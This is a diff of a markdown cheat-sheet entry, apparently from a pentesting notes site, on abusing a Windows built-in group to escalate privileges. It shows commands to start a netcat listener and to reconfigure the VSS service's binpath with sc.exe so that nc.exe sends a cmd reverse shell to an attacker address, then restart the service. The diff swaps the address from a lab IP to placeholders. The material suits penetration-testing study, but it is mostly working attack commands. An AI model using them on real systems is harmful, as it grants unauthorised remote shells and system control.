@@ -4,14 +4,13 @@ date: 2024-7-24
 tags: ["built-in group", "active driectory", "ad", "Windows", "privesc"]
 ---
 
----
 #### Abuse #1. Modify Service Path
 
 <div>
 
-```bash
+```console
 # Start a nc listener
-rlwrap nc -lvnp 443
+rlwrap nc -lvnp <LOCAL_PORT>
 ```
 
 </div>
@@ -21,17 +20,17 @@ rlwrap nc -lvnp 443
 
 <div>
 
-```powershell
+```console
 # Assumed nc.exe is uploaded
-sc.exe config VSS binpath="C:\ProgramData\nc.exe -e cmd 10.10.14.10 443"
+sc.exe config VSS binpath="C:\ProgramData\nc.exe -e cmd <LOCAL_IP> <LOCAL_PORT>"
 ```
 
-```powershell
+```console
 # Stop service
 sc.exe stop VSS
 ```
 
-```powershell
+```console
 # Start service
 sc.exe start VSS
 ```
